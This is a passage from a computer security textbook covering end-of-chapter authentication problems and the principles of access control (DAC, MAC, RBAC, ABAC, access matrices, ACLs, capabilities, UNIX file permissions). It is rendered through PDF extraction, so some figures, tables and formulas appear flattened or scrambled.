size to, say, 24 or 48 bits?\\r\\n3.10 Consider the Bloom filter discussed in Section 3.3. Define k = number of hash func\\ufffetions; N = number of bits in hash table; and D = number of words in dictionary.\\r\\na. Show that the expected number of bits in the hash table that are equal to zero is \\r\\nexpressed as\\r\\nf = a1 - k\\r\\nNb\\r\\nD\\r\\nM03_STAL0611_04_GE_C03.indd 125 10/11/17 2:45 PM\\r\\nhttps://sanet.st/blogs/polatebooks\\n\\n\\n126 CHAPTER 3 / USER AUTHENTICATION\\r\\nb. Show that the probability that an input word, not in the dictionary, will be falsely \\r\\naccepted as being in the dictionary is\\r\\nP = (1 - f)\\r\\nk\\r\\nc. Show that the preceding expression can be approximated as\\r\\nP ≈ (1 - e-kD/N)\\r\\nk\\r\\n3.11 For the biometric authentication protocols illustrated in Figure 3.13, note the biometric \\r\\ncapture device is authenticated in the case of a static biometric but not authenticated \\r\\nfor a dynamic biometric. Explain why authentication is useful in the case of a stable \\r\\nbiometric, but not needed in the case of a dynamic biometric.\\r\\n3.12 A relatively new authentication proposal is the Secure Quick Reliable Login (SQRL) \\r\\ndescribed here: https://www.grc.com/sqrl/sqrl.htm. Write a brief summary of how \\r\\nSQRL works and indicate how it fits into the categories of types of user authentica\\ufffetion listed in this chapter.\\r\\nM03_STAL0611_04_GE_C03.indd 126 10/11/17 2:45 PM\\n\\n\\n127\\r\\n4.1 Access Control Principles\\r\\nAccess Control Context\\r\\nAccess Control Policies\\r\\n4.2 Subjects, Objects, and Access Rights\\r\\n4.3 Discretionary Access Control\\r\\nAn Access Control Model\\r\\nProtection Domains\\r\\n4.4 Example: Unix File Access Control\\r\\nTraditional UNIX File Access Control\\r\\nAccess Control Lists in UNIX\\r\\n4.5 Role-Based Access Control\\r\\nRBAC Reference Models\\r\\n4.6 Attribute-Based Access Control\\r\\nAttributes\\r\\nABAC Logical Architecture\\r\\nABAC Policies\\r\\n4.7 Identity, Credential, and Access Management\\r\\nIdentity Management\\r\\nCredential Management\\r\\nAccess Management\\r\\nIdentity Federation\\r\\n4.8 Trust Frameworks\\r\\nTraditional Identity Exchange Approach\\r\\nOpen Identity Trust Framework\\r\\n4.9 Case Study: RBAC System for a Bank\\r\\n4.10 Key Terms, Review Questions, and Problems\\r\\nAccess Control\\r\\nCHAPTER \\r\\nM04_STAL0611_04_GE_C04.indd 127 10/11/17 2:47 PM\\n\\n\\n128 CHAPTER 4 / ACCESS CONTROL\\r\\nTwo definitions of access control are useful in understanding its scope.\\r\\n1. NISTIR 7298 (Glossary of Key Information Security Terms, May 2013), defines \\r\\naccess control as the process of granting or denying specific requests to: (1) \\r\\nobtain and use information and related information processing services; and \\r\\n(2) enter specific physical facilities.\\r\\n2. RFC 4949, Internet Security Glossary, defines access control as a process by \\r\\nwhich use of system resources is regulated according to a security policy and \\r\\nis permitted only by authorized entities (users, programs, processes, or other \\r\\nsystems) according to that policy.\\r\\nWe can view access control as a central element of computer security. The prin\\ufffecipal objectives of computer security are to prevent unauthorized users from gaining \\r\\naccess to resources, to prevent legitimate users from accessing resources in an unau\\ufffethorized manner, and to enable legitimate users to access resources in an authorized \\r\\nmanner. Table 4.1, from NIST SP 800-171 (Protecting Controlled Unclassified Infor\\ufffemation in Nonfederal Information Systems and Organizations, August 2016), provides \\r\\na useful list of security requirements for access control services.\\r\\nWe begin this chapter with an overview of some important concepts. Next \\r\\nwe look at three widely used techniques for implementing access control policies. \\r\\nWe then turn to a broader perspective of the overall management of access control \\r\\nusing identity, credentials, and attributes. Finally, the concept of a trust framework \\r\\nis introduced.\\r\\n4.1 ACCESS CONTROL PRINCIPLES\\r\\nIn a broad sense, all of computer security is concerned with access control. Indeed, \\r\\nRFC 4949 defines computer security as follows: measures that implement and assure \\r\\nsecurity services in a computer system, particularly those that assure access control \\r\\nLEARNING OBJECTIVES\\r\\nAfter studying this chapter, you should be able to:\\r\\n◆ Explain how access control fits into the broader context that includes \\r\\nauthentication, authorization, and audit.\\r\\n◆ Define the three major categories of access control policies.\\r\\n◆ Distinguish among subjects, objects, and access rights.\\r\\n◆ Describe the UNIX file access control model.\\r\\n◆ Discuss the principal concepts of role-based access control.\\r\\n◆ Summarize the RBAC model.\\r\\n◆ Discuss the principal concepts of attribute-based access control.\\r\\n◆ Explain the identity, credential, and access management model.\\r\\n◆ Understand the concept of identity federation and its relationship to a trust \\r\\nframework.\\r\\nM04_STAL0611_04_GE_C04.indd 128 10/11/17 2:47 PM\\n\\n\\n4.1 / ACCESS CONTROL PRINCIPLES 129\\r\\nservice. This chapter deals with a narrower, more specific concept of access control: \\r\\nAccess control implements a security policy that specifies who or what (e.g., in the \\r\\ncase of a process) may have access to each specific system resource, and the type of \\r\\naccess that is permitted in each instance.\\r\\nAccess Control Context\\r\\nFigure 4.1 shows a broader context of access control. In addition to access control, \\r\\nthis context involves the following entities and functions:\\r\\n• Authentication: Verification that the credentials of a user or other system entity \\r\\nare valid.\\r\\nBasic Security Requirements\\r\\n1 Limit information system access to authorized users, processes acting on behalf of authorized users, or \\r\\ndevices (including other information systems).\\r\\n2 Limit information system access to the types of transactions and functions that authorized users are \\r\\npermitted to execute.\\r\\nDerived Security Requirements\\r\\n3 Control the flow of CUI in accordance with approved authorizations.\\r\\n4 Separate the duties of individuals to reduce the risk of malevolent activity without collusion.\\r\\n5 Employ the principle of least privilege, including for specific security functions and privileged accounts.\\r\\n6 Use non-privileged accounts or roles when accessing nonsecurity functions.\\r\\n7 Prevent non-privileged users from executing privileged functions and audit the execution of such functions.\\r\\n8 Limit unsuccessful logon attempts.\\r\\n9 Provide privacy and security notices consistent with applicable CUI rules.\\r\\n10 Use session lock with pattern-hiding displays to prevent access and viewing of data after period of inactivity.\\r\\n11 Terminate (automatically) a user session after a defined condition.\\r\\n12 Monitor and control remote access sessions.\\r\\n13 Employ cryptographic mechanisms to protect the confidentiality of remote access sessions.\\r\\n14 Route remote access via managed access control points.\\r\\n15 Authorize remote execution of privileged commands and remote access to security-relevant information.\\r\\n16 Authorize wireless access prior to allowing such connections.\\r\\n17 Protect wireless access using authentication and encryption.\\r\\n18 Control connection of mobile devices.\\r\\n19 Encrypt CUI on mobile devices.\\r\\n20 Verify and control/limit connections to and use of external information systems.\\r\\n21 Limit use of organizational portable storage devices on external information systems.\\r\\n22 Control CUI posted or processed on publicly accessible information systems.\\r\\nCUI = controlled unclassified information\\r\\nSource: From NIST SP 800-171 Protecting Controlled Unclassified Information in Nonfederal Information \\r\\nSystems and Organizations, December 2016 National Institute of Standards and Technology (NIST), United \\r\\nStates Department of Commerce.\\r\\nTable 4.1 Access Control Security Requirements (SP 800-171)\\r\\nM04_STAL0611_04_GE_C04.indd 129 10/11/17 2:47 PM\\n\\n\\n130 CHAPTER 4 / ACCESS CONTROL\\r\\n• Authorization: The granting of a right or permission to a system entity to access \\r\\na system resource. This function determines who is trusted for a given purpose.\\r\\n• Audit: An independent review and examination of system records and activi\\ufffeties in order to test for adequacy of system controls, to ensure compliance with \\r\\nestablished policy and operational procedures, to detect breaches in security, \\r\\nand to recommend any indicated changes in control, policy, and procedures.\\r\\nAn access control mechanism mediates between a user (or a process executing \\r\\non behalf of a user) and system resources, such as applications, operating systems, \\r\\nfirewalls, routers, files, and databases. The system must first authenticate an entity \\r\\nseeking access. Typically, the authentication function determines whether the user is \\r\\npermitted to access the system at all. Then the access control function determines if \\r\\nthe specific requested access by this user is permitted. A security administrator main\\ufffetains an authorization database that specifies what type of access to which resources \\r\\nis allowed for this user. The access control function consults this database to deter\\ufffemine whether to grant access. An auditing function monitors and keeps a record of \\r\\nuser accesses to system resources.\\r\\nFigure 4.1 Relationship Among Access Control and Other Security Functions\\r\\nSource: Based on [SAND94].\\r\\nAuthentication\\r\\nfunction\\r\\nAuthentication\\r\\nAuditing\\r\\nSystem resources\\r\\nAuthorization\\r\\ndatabase\\r\\nSecurity administrator\\r\\nUser\\r\\nAccess control\\r\\nAccess\\r\\ncontrol\\r\\nfunction\\r\\nM04_STAL0611_04_GE_C04.indd 130 10/11/17 2:47 PM\\n\\n\\n4.2 / SUBJECTS, OBJECTS, AND ACCESS RIGHTS 131\\r\\nIn the simple model of Figure 4.1, the access control function is shown as a single \\r\\nlogical module. In practice, a number of components may cooperatively share the access \\r\\ncontrol function. All operating systems have at least a rudimentary, and in many cases \\r\\na quite robust, access control component. Add-on security packages can supplement \\r\\nthe native access control capabilities of the operating system. Particular applications \\r\\nor utilities, such as a database management system, also incorporate access control \\r\\nfunctions. External devices, such as firewalls, can also provide access control services.\\r\\nAccess Control Policies\\r\\nAn access control policy, which can be embodied in an authorization database, dic\\ufffetates what types of access are permitted, under what circumstances, and by whom. \\r\\nAccess control policies are generally grouped into the following categories:\\r\\n• Discretionary access control (DAC): Controls access based on the identity of \\r\\nthe requestor and on access rules (authorizations) stating what requestors are \\r\\n(or are not) allowed to do. This policy is termed discretionary because an entity \\r\\nmight have access rights that permit the entity, by its own volition, to enable \\r\\nanother entity to access some resource.\\r\\n• Mandatory access control (MAC): Controls access based on comparing secu\\uffferity labels (which indicate how sensitive or critical system resources are) with \\r\\nsecurity clearances (which indicate system entities are eligible to access certain \\r\\nresources). This policy is termed mandatory because an entity that has clearance \\r\\nto access a resource may not, just by its own volition, enable another entity to \\r\\naccess that resource.\\r\\n• Role-based access control (RBAC): Controls access based on the roles that \\r\\nusers have within the system and on rules stating what accesses are allowed to \\r\\nusers in given roles.\\r\\n• Attribute-based access control (ABAC): Controls access based on attributes \\r\\nof the user, the resource to be accessed, and current environmental conditions.\\r\\nDAC is the traditional method of implementing access control, and is exam\\ufffeined in Sections 4.3 and 4.4. MAC is a concept that evolved out of requirements for \\r\\nmilitary information security and is best covered in the context of trusted systems, \\r\\nwhich we deal with in Chapter 27. Both RBAC and ABAC have become increasingly \\r\\npopular, and are examined in Sections 4.5 and 4.6, respectively.\\r\\nThese four policies are not mutually exclusive. An access control mechanism \\r\\ncan employ two or even all three of these policies to cover different classes of system \\r\\nresources.\\r\\n4.2 SUBJECTS, OBJECTS, AND ACCESS RIGHTS\\r\\nThe basic elements of access control are: subject, object, and access right.\\r\\nA subject is an entity capable of accessing objects. Generally, the concept of \\r\\nsubject equates with that of process. Any user or application actually gains access to \\r\\nan object by means of a process that represents that user or application. The process \\r\\ntakes on the attributes of the user, such as access rights.\\r\\nM04_STAL0611_04_GE_C04.indd 131 10/11/17 2:47 PM\\n\\n\\n132 CHAPTER 4 / ACCESS CONTROL\\r\\nA subject is typically held accountable for the actions they have initiated, and \\r\\nan audit trail may be used to record the association of a subject with security-relevant \\r\\nactions performed on an object by the subject.\\r\\nBasic access control systems typically define three classes of subject, with \\r\\ndifferent access rights for each class:\\r\\n• Owner: This may be the creator of a resource, such as a file. For system resources, \\r\\nownership may belong to a system administrator. For project resources, a proj\\ufffeect administrator or leader may be assigned ownership.\\r\\n• Group: In addition to the privileges assigned to an owner, a named group of \\r\\nusers may also be granted access rights, such that membership in the group is \\r\\nsufficient to exercise these access rights. In most schemes, a user may belong \\r\\nto multiple groups.\\r\\n• World: The least amount of access is granted to users who are able to access the \\r\\nsystem but are not included in the categories owner and group for this resource.\\r\\nAn object is a resource to which access is controlled. In general, an object is an \\r\\nentity used to contain and/or receive information. Examples include records, blocks, \\r\\npages, segments, files, portions of files, directories, directory trees, mailboxes, mes\\ufffesages, and programs. Some access control systems also encompass, bits, bytes, words, \\r\\nprocessors, communication ports, clocks, and network nodes.\\r\\nThe number and types of objects to be protected by an access control system \\r\\ndepends on the environment in which access control operates and the desired trad\\ufffeeoff between security on the one hand, and complexity, processing burden, and ease \\r\\nof use on the other hand.\\r\\nAn access right describes the way in which a subject may access an object. \\r\\nAccess rights could include the following:\\r\\n• Read: User may view information in a system resource (e.g., a file, selected \\r\\nrecords in a file, selected fields within a record, or some combination). Read \\r\\naccess includes the ability to copy or print.\\r\\n• Write: User may add, modify, or delete data in system resource (e.g., files, \\r\\nrecords, programs). Write access includes read access.\\r\\n• Execute: User may execute specified programs.\\r\\n• Delete: User may delete certain system resources, such as files or records.\\r\\n• Create: User may create new files, records, or fields.\\r\\n• Search: User may list the files in a directory or otherwise search the directory.\\r\\n4.3 DISCRETIONARY ACCESS CONTROL\\r\\nAs was previously stated, a discretionary access control scheme is one in which an \\r\\nentity may be granted access rights that permit the entity, by its own volition, to \\r\\nenable another entity to access some resource. A general approach to DAC, as exer\\ufffecised by an operating system or a database management system, is that of an access \\r\\nmatrix. The access matrix concept was formulated by Lampson [LAMP69, LAMP71], \\r\\nM04_STAL0611_04_GE_C04.indd 132 10/11/17 2:47 PM\\n\\n\\n4.3 / DISCRETIONARY ACCESS CONTROL 133\\r\\nand subsequently refined by Graham and Denning [GRAH72, DENN71] and by \\r\\nHarrison et al. [HARR76].\\r\\nOne dimension of the matrix consists of identified subjects that may attempt \\r\\ndata access to the resources. Typically, this list will consist of individual users or user \\r\\ngroups, although access could be controlled for terminals, network equipment, hosts, \\r\\nor applications instead of or in addition to users. The other dimension lists the objects \\r\\nthat may be accessed. At the greatest level of detail, objects may be individual data \\r\\nfields. More aggregate groupings, such as records, files, or even the entire database, \\r\\nmay also be objects in the matrix. Each entry in the matrix indicates the access rights \\r\\nof a particular subject for a particular object.\\r\\nFigure 4.2a, based on a figure in [SAND94], is a simple example of an access \\r\\nmatrix. Thus, user A owns files 1 and 3 and has read and write access rights to those \\r\\nfiles. User B has read access rights to file 1, and so on.\\r\\nIn practice, an access matrix is usually sparse and is implemented by decom\\ufffeposition in one of two ways. The matrix may be decomposed by columns, yielding \\r\\naccess control lists (ACLs) (see Figure 4.2b). For each object, an ACL lists users and \\r\\ntheir permitted access rights. The ACL may contain a default, or public, entry. This \\r\\nallows users that are not explicitly listed as having special rights to have a default set \\r\\nof rights. The default set of rights should always follow the rule of least privilege or \\r\\nread-only access, whichever is applicable. Elements of the list may include individual \\r\\nusers as well as groups of users.\\r\\nWhen it is desired to determine which subjects have which access rights to a \\r\\nparticular resource, ACLs are convenient, because each ACL provides the informa\\ufffetion for a given resource. However, this data structure is not convenient for determin\\ufffeing the access rights available to a specific user.\\r\\nDecomposition by rows yields capability tickets (see Figure 4.2c). A capability \\r\\nticket specifies authorized objects and operations for a particular user. Each user has a \\r\\nnumber of tickets and may be authorized to loan or give them to others. Because tickets \\r\\nmay be dispersed around the system, they present a greater security problem than access \\r\\ncontrol lists. The integrity of the ticket must be protected, and guaranteed (usually by \\r\\nthe operating system). In particular, the ticket must be unforgeable. One way to accom\\ufffeplish this is to have the operating system hold all tickets on behalf of users. These tickets \\r\\nwould have to be held in a region of memory inaccessible to users. Another alternative is \\r\\nto include an unforgeable token in the capability. This could be a large random password, \\r\\nor a cryptographic message authentication code. This value is verified by the relevant \\r\\nresource whenever access is requested. This form of capability ticket is appropriate for \\r\\nuse in a distributed environment, when the security of its contents cannot be guaranteed.\\r\\nThe convenient and inconvenient aspects of capability tickets are the opposite \\r\\nof those for ACLs. It is easy to determine the set of access rights that a given user \\r\\nhas, but more difficult to determine the list of users with specific access rights for a \\r\\nspecific resource.\\r\\n[SAND94] proposes a data structure that is not sparse, like the access matrix, \\r\\nbut is more convenient than either ACLs or capability lists (see Table 4.2). An autho\\uffferization table contains one row for one access right of one subject to one resource. \\r\\nSorting or accessing the table by subject is equivalent to a capability list. Sorting or \\r\\naccessing the table by object is equivalent to an ACL. A relational database can easily \\r\\nimplement an authorization table of this type.\\r\\nM04_STAL0611_04_GE_C04.indd 133 10/11/17 2:47 PM\\n\\n\\n134 CHAPTER 4 / ACCESS CONTROL\\r\\nAn Access Control Model\\r\\nThis section introduces a general model for DAC developed by Lampson, Graham, \\r\\nand Denning [LAMP71, GRAH72, DENN71]. The model assumes a set of subjects, \\r\\na set of objects, and a set of rules that govern the access of subjects to objects. Let us \\r\\ndefine the protection state of a system to be the set of information, at a given point in \\r\\ntime, that specifies the access rights for each subject with respect to each object. We \\r\\ncan identify three requirements: representing the protection state, enforcing access \\r\\nrights, and allowing subjects to alter the protection state in certain ways. The model \\r\\naddresses all three requirements, giving a general, logical description of a DAC system.\\r\\nFigure 4.2 Example of Access Control Structures\\r\\n(b) Access control lists for files of part (a)\\r\\n(c) Capability lists for files of part (a)\\r\\n(a) Access matrix\\r\\nFile 1 A\\r\\nFile 1 File 2\\r\\nOBJECTS\\r\\nFile 3 File 4\\r\\nOwn\\r\\nR\\r\\nW\\r\\nB\\r\\nR\\r\\nC\\r\\nR\\r\\nW\\r\\nFile 2 B\\r\\nOwn\\r\\nR\\r\\nW\\r\\nC\\r\\nR\\r\\nFile 3 A\\r\\nOwn\\r\\nR\\r\\nW\\r\\nB\\r\\nW\\r\\nFile 4 B\\r\\nR\\r\\nC\\r\\nOwn\\r\\nR\\r\\nW\\r\\nUser B File 1 File 2\\r\\nR\\r\\nFile 3\\r\\nUser A File 1\\r\\nUser A\\r\\nUser B Read\\r\\nRead\\r\\nWrite Read\\r\\nRead\\r\\nWrite\\r\\nOwn\\r\\nRead\\r\\nWrite\\r\\nOwn\\r\\nRead\\r\\nWrite\\r\\nOwn\\r\\nRead\\r\\nWrite\\r\\nOwn\\r\\nRead\\r\\nWrite\\r\\nSUBJECTS\\r\\nUser C\\r\\nOwn\\r\\nR\\r\\nW\\r\\nFile 3\\r\\nOwn\\r\\nR\\r\\nW\\r\\nFile 4\\r\\nOwn\\r\\nR\\r\\nW\\r\\nW R\\r\\nUser C File 1 File 2\\r\\nR\\r\\nW\\r\\nFile 4\\r\\nOwn\\r\\nR\\r\\nW\\r\\nR\\r\\nM04_STAL0611_04_GE_C04.indd 134 10/11/17 2:47 PM\\n\\n\\n4.3 / DISCRETIONARY ACCESS CONTROL 135\\r\\nTo represent the protection state, we extend the universe of objects in the access \\r\\ncontrol matrix to include the following:\\r\\n• Processes: Access rights include the ability to delete a process, stop (block), and \\r\\nwake up a process.\\r\\n• Devices: Access rights include the ability to read/write the device, to control its \\r\\noperation (e.g., a disk seek), and to block/unblock the device for use.\\r\\n• Memory locations or regions: Access rights include the ability to read/write \\r\\ncertain regions of memory that are protected such that the default is to disal\\ufffelow access.\\r\\n• Subjects: Access rights with respect to a subject have to do with the ability \\r\\nto grant or delete access rights of that subject to other objects, as explained \\r\\nsubsequently.\\r\\nFigure 4.3 is an example. For an access control matrix A, each entry A[S, X] \\r\\ncontains strings, called access attributes, that specify the access rights of subject S to \\r\\nobject X. For example, in Figure 4.3, S1 may read file F1, because ‘read’ appears in \\r\\nA[S1, F1].\\r\\nFrom a logical or functional point of view, a separate access control module \\r\\nis associated with each type of object (see Figure 4.4). The module evaluates each \\r\\nSubject Access Mode Object\\r\\nA Own File 1\\r\\nA Read File 1\\r\\nA Write File 1\\r\\nA Own File 3\\r\\nA Read File 3\\r\\nA Write File 3\\r\\nB Read File 1\\r\\nB Own File 2\\r\\nB Read File 2\\r\\nB Write File 2\\r\\nB Write File 3\\r\\nB Read File 4\\r\\nC Read File 1\\r\\nC Write File 1\\r\\nC Read File 2\\r\\nC Own File 4\\r\\nC Read File 4\\r\\nC Write File 4\\r\\nTable 4.2 Authorization Table for Files in Figure 4.2\\r\\nM04_STAL0611_04_GE_C04.indd 135 10/11/17 2:47 PM\\n\\n\\n136 CHAPTER 4 / ACCESS CONTROL\\r\\nrequest by a subject to access an object to determine if the access right exists. An \\r\\naccess attempt triggers the following steps:\\r\\n1. A subject S0 issues a request of type a for object X.\\r\\n2. The request causes the system (the operating system or an access control interface \\r\\nmodule of some sort) to generate a message of the form (S0, a, X) to the control\\ufffeler for X.\\r\\n3. The controller interrogates the access matrix A to determine if a is in A[S0, X].\\r\\nIf so, the access is allowed; if not, the access is denied and a protection violation \\r\\noccurs. The violation should trigger a warning and appropriate action.\\r\\nFigure 4.4 suggests that every access by a subject to an object is mediated by \\r\\nthe controller for that object, and that the controller’s decision is based on the cur\\uffferent contents of the matrix. In addition, certain subjects have the authority to make \\r\\nspecific changes to the access matrix. A request to modify the access matrix is treated \\r\\nas an access to the matrix, with the individual entries in the matrix treated as objects. \\r\\nSuch accesses are mediated by an access matrix controller, which controls updates \\r\\nto the matrix.\\r\\nThe model also includes a set of rules that govern modifications to the access \\r\\nmatrix, as shown in Table 4.3. For this purpose, we introduce the access rights ‘owner’ \\r\\nand ‘control’ and the concept of a copy flag, as explained in the subsequent paragraphs.\\r\\nThe first three rules deal with transferring, granting, and deleting access rights. \\r\\nSuppose the entry a* exists in A[S0, X]. This means S0 has access right a to subject \\r\\nX and, because of the presence of the copy flag, can transfer this right, with or with\\ufffeout copy flag, to another subject. Rule R1 expresses this capability. A subject would \\r\\ntransfer the access right without the copy flag if there were a concern that the new \\r\\nsubject would maliciously transfer the right to another subject that should not have \\r\\nthat access right. For example, S1 may place ‘read’ or ‘read*’ in any matrix entry in \\r\\nthe F1 column. Rule R2 states that if S0 is designated as the owner of object X, then \\r\\nS0 can grant an access right to that object for any other subject. Rule R2 states that \\r\\nFigure 4.3 Extended Access Control Matrix\\r\\nS1\\r\\nS1 S2 S3 F1 F2 P1 P2 D1 D2\\r\\nS2\\r\\nS3\\r\\nSubjects\\r\\nSUBJECTS\\r\\nFiles Processes Disk drives\\r\\nOBJECTS\\r\\n* copy flag set\\r\\ncontrol owner\\r\\ncontrol\\r\\nwrite\\r\\nwrite* execute\\r\\nstop\\r\\nwakeup wakeup seek\\r\\nseek*\\r\\nread\\r\\nowner\\r\\nowner\\r\\nread* owner\\r\\ncontrol\\r\\ncontrol\\r\\nowner\\r\\nM04_STAL0611_04_GE_C04.indd 136 10/11/17 2:47 PM\\n\\n\\n4.3 / DISCRETIONARY ACCESS CONTROL 137\\r\\nS0 can add any access right to A[S, X] for any S, if S0 has ‘owner’ access to X. Rule R3 \\r\\npermits S0 to delete any access right from any matrix entry in a row for which S0 con\\ufffetrols the subject, and for any matrix entry in a column for which S0 owns the object. \\r\\nRule R4 permits a subject to read that portion of the matrix that it owns or controls.\\r\\nThe remaining rules in Table 4.3 govern the creation and deletion of subjects \\r\\nand objects. Rule R5 states that any subject can create a new object, which it owns, \\r\\nand can then grant and delete access to the object. Under Rule R6, the owner of an \\r\\nobject can destroy the object, resulting in the deletion of the corresponding column \\r\\nof the access matrix. Rule R7 enables any subject to create a new subject; the creator \\r\\nowns the new subject and the new subject has control access to itself. Rule R8 permits \\r\\nthe owner of a subject to delete the row and column (if there are subject columns) \\r\\nof the access matrix designated by that subject.\\r\\nThe set of rules in Table 4.3 is an example of the rule set that could be defined \\r\\nfor an access control system. The following are examples of additional or alternative \\r\\nFigure 4.4 An Organization of the Access Control Function\\r\\nMemory\\r\\naddressing\\r\\nhardware\\r\\nInstruction\\r\\ndecoding\\r\\nhardware\\r\\nInstructions\\r\\nTerminal\\r\\n& device\\r\\nmanager\\r\\nTerminal\\r\\n& devices\\r\\nAccess\\r\\nmatrix\\r\\nmonitor\\r\\nAccess\\r\\nwrite matrix read\\r\\nProcess\\r\\nmanager\\r\\nSubjects\\r\\nread F\\r\\nSi\\r\\nSj\\r\\nwakeup P (Sj, wakeup, P)\\r\\nSk\\r\\nSm\\r\\ndelete b from Sp, Y (Sm, delete, b, Sp, Y)\\r\\n(Sk, grant, a, Sn, X) grant a to Sn, X\\r\\n(Si, read, F)\\r\\nAccess control mechanisms\\r\\nSystem intervention\\r\\nObjects\\r\\nFiles\\r\\nSegments\\r\\n& pages\\r\\nProcesses\\r\\nFile\\r\\nsystem\\r\\nM04_STAL0611_04_GE_C04.indd 137 10/11/17 2:47 PM\\n\\n\\n138 CHAPTER 4 / ACCESS CONTROL\\r\\nrules that could be included. A transfer-only right could be defined, which results in \\r\\nthe transferred right being added to the target subject and deleted from the transfer\\ufffering subject. The number of owners of an object or a subject could be limited to one \\r\\nby not allowing the copy flag to accompany the owner right.\\r\\nThe ability of one subject to create another subject and to have ‘owner’ access \\r\\nright to that subject can be used to define a hierarchy of subjects. For example, in \\r\\nFigure 4.3, S1 owns S2 and S3, so S2 and S3 are subordinate to S1. By the rules of Table \\r\\n4.3, S1 can grant and delete to S2 access rights that S1 already has. Thus, a subject can \\r\\ncreate another subject with a subset of its own access rights. This might be useful, for \\r\\nexample, if a subject is invoking an application that is not fully trusted and does not \\r\\nwant that application to be able to transfer access rights to other subjects.\\r\\nProtection Domains\\r\\nThe access control matrix model that we have discussed so far associates a set \\r\\nof capabilities with a user. A more general and more flexible approach, proposed \\r\\nin [LAMP71], is to associate capabilities with protection domains. A protection \\r\\ndomain is a set of objects together with access rights to those objects. In terms \\r\\nof the access matrix, a row defines a protection domain. So far, we have equated \\r\\neach row with a specific user. So, in this limited model, each user has a protection \\r\\ndomain, and any processes spawned by the user have access rights defined by the \\r\\nsame protection domain.\\r\\nRule Command (by S0) Authorization Operation\\r\\nR1\\r\\ntransfer b\\r\\na*\\r\\na r to S, X ‘=a*> in A[S0, X]\\r\\nstore b\\r\\na*\\r\\na r in A[S, X]\\r\\nR2\\r\\ngrant b\\r\\na*\\r\\na r to S, X\\r\\n‘owner’ in A[S0, X]å\\r\\nstore b\\r\\na*\\r\\na r in A[S, X]\\r\\nR3\\r\\ndelete A from S, X\\r\\n‘control’ in A[S0, S]\\r\\nor\\r\\n‘owner’ in A[S0, X]\\r\\ndelete a from A[S, X]\\r\\nR4\\r\\nw d read S, X\\r\\n‘control’ in A[S0, S]\\r\\nor\\r\\n‘owner’ in A[S0, X]\\r\\ncopy A[S, X] into w\\r\\nR5 create object X None add column for X to A; store \\r\\n‘owner’ in A[S0, X]\\r\\nR6 destroy object X ‘owner’ in A[S0, X] delete column for X from A\\r\\nR7 create subject S none add row for S to A; execute \\r\\ncreate object S; store \\r\\n‘control’ in A[S, S]\\r\\nR8 destroy subject S ‘owner’ in A[S0, S] delete row for S from A; \\r\\nexecute destroy object S\\r\\nTable 4.3 Access Control System Commands\\r\\nM04_STAL0611_04_GE_C04.indd 138 10/11/17 2:47 PM\\n\\n\\n4.4 / EXAMPLE: UNIX FILE ACCESS CONTROL 139\\r\\nA more general concept of protection domain provides more flexibility. For \\r\\nexample, a user can spawn processes with a subset of the access rights of the user, \\r\\ndefined as a new protection domain. This limits the capability of the process. Such a \\r\\nscheme could be used by a server process to spawn processes for different classes of \\r\\nusers. Also, a user could define a protection domain for a program that is not fully \\r\\ntrusted, so its access is limited to a safe subset of the user’s access rights.\\r\\nThe association between a process and a domain can be static or dynamic. For \\r\\nexample, a process may execute a sequence of procedures and require different access \\r\\nrights for each procedure, such as read file and write file. In general, we would like \\r\\nto minimize the access rights that any user or process has at any one time; the use of \\r\\nprotection domains provides a simple means to satisfy this requirement.\\r\\nOne form of protection domain has to do with the distinction made in many \\r\\noperating systems, such as UNIX, between user and kernel mode. A user program \\r\\nexecutes in a user mode, in which certain areas of memory are protected from the \\r\\nuser’s use and in which certain instructions may not be executed. When the user pro\\ufffecess calls a system routine, that routine executes in a system mode, or what has come \\r\\nto be called kernel mode, in which privileged instructions may be executed and in \\r\\nwhich protected areas of memory may be accessed.\\r\\n4.4 EXAMPLE: UNIX FILE ACCESS CONTROL\\r\\nFor our discussion of UNIX file access control, we first introduce several basic con\\ufffecepts concerning UNIX files and directories.\\r\\nAll types of UNIX files are administered by the operating system by means of \\r\\ninodes. An inode (index node) is a control structure that contains the key informa\\ufffetion needed by the operating system for a particular file. Several file names may be \\r\\nassociated with a single inode, but an active inode is associated with exactly one file, \\r\\nand each file is controlled by exactly one inode. The attributes of the file as well as \\r\\nits permissions and other control information are stored in the inode. On the disk, \\r\\nthere is an inode table, or inode list, that contains the inodes of all the files in the file \\r\\nsystem. When a file is opened, its inode is brought into main memory and stored in \\r\\na memory-resident inode table.\\r\\nDirectories are structured in a hierarchical tree. Each directory can contain \\r\\nfiles and/or other directories. A directory that is inside another directory is referred \\r\\nto as a subdirectory. A directory is simply a file that contains a list of file names plus \\r\\npointers to associated inodes. Thus, associated with each directory is its own inode.\\r\\nTraditional UNIX File Access Control\\r\\nMost UNIX systems depend on, or at least are based on, the file access control scheme \\r\\nintroduced with the early versions of UNIX. Each UNIX user is assigned a unique \\r\\nuser identification number (user ID). A user is also a member of a primary group, \\r\\nand possibly a number of other groups, each identified by a group ID. When a file is \\r\\ncreated, it is designated as owned by a particular user and marked with that user’s \\r\\nID. It also belongs to a specific group, which initially is either its creator’s primary \\r\\ngroup, or the group of its parent directory if that directory has SetGID permission \\r\\nM04_STAL0611_04_GE_C04.indd 139 10/11/17 2:47 PM\\n\\n\\n140 CHAPTER 4 / ACCESS CONTROL\\r\\nset. Associated with each file is a set of 12 protection bits. The owner ID, group ID, \\r\\nand protection bits are part of the file’s inode.\\r\\nNine of the protection bits specify read, write, and execute permission for the \\r\\nowner of the file, other members of the group to which this file belongs, and all other \\r\\nusers. These form a hierarchy of owner, group, and all others, with the highest relevant \\r\\nset of permissions being used. Figure 4.5a shows an example in which the file owner \\r\\nhas read and write access; all other members of the file’s group have read access; and \\r\\nusers outside the group have no access rights to the file. When applied to a directory, \\r\\nthe read and write bits grant the right to list and to create/rename/delete files in the \\r\\ndirectory.1\\r\\n The execute bit grants the right to descend into the directory or search it \\r\\nfor a filename.\\r\\n1\\r\\nNote that the permissions that apply to a directory are distinct from those that apply to any file or direc\\ufffetory it contains. The fact that a user has the right to write to the directory does not give the user the right \\r\\nto write to a file in that directory. That is governed by the permissions of the specific file. The user would, \\r\\nhowever, have the right to rename the file.\\r\\nFigure 4.5 UNIX File Access Control\\r\\nuser: :rw\\uffferw- r-- ---\\r\\ngroup::r--\\r\\nother::---\\r\\nOwner class\\r\\nGroup class\\r\\nOther class\\r\\n(a) Traditional UNIX approach (minimal access control list)\\r\\n(b) Extended access control list\\r\\nMasked\\r\\nentries\\r\\nuser: :rw\\ufffemask::rw\\ufffeuser:joe:rw\\ufffegroup::r--\\r\\nother::---\\r\\nrw- rw- ---\\r\\nOwner 